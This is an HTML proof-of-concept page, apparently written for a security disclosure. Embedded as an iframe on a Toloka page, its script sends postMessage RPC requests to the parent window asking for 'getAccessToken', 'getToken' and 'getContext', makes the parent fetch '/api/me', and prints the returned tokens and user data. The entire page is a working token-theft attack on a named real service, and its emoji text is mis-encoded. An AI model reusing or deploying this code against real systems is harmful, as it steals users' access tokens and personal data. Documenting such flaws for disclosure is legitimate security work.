<!DOCTYPE html>
<html>
<head>
  <title>Toloka iframe RPC PoC</title>
  <meta charset="UTF-8">
  <style>
    body { font-family: sans-serif; background: #111; color: #0f0; padding: 1em; }
    pre { background: #000; padding: 1em; border: 1px solid #0f0; overflow: auto; }
  </style>
</head>
<body>
  <h1>üî• Toloka RPC PoC via iframe</h1>
  <div id="output"><pre>‚è≥ Waiting for responses...</pre></div>

  <script>
    const output = document.querySelector('#output pre');

    function log(msg, data) {
      output.textContent += `\n\n${msg}\n${JSON.stringify(data, null, 2)}`;
      console.log(`[PoC Log]`, msg, data);
    }

    function callRPC(method, payload = {}) {
      const id = crypto.randomUUID();
      window.addEventListener('message', function handler(e) {
        if (e.origin !== "https://tb.toloka.dev") return;
        if (e.data?.id === id && e.data?.type === 'rpc') {
          log(`[‚úÖ ${method}]`, e.data.payload);
          window.removeEventListener('message', handler);
        }
      });
      window.parent.postMessage({ type: 'rpc', id, name: method, payload }, '*');
      log(`[üì§ ${method} Request sent...]`, { id, payload });
    }

    // Call sensitive RPC methods
    ['getAccessToken', 'getToken', 'getContext'].forEach(method => callRPC(method));

    // Also fetch user data (optional)
    callRPC('fetch', {
      url: '/api/me',
      requestInit: { method: 'GET' }
    });
  </script>
</body>
</html>
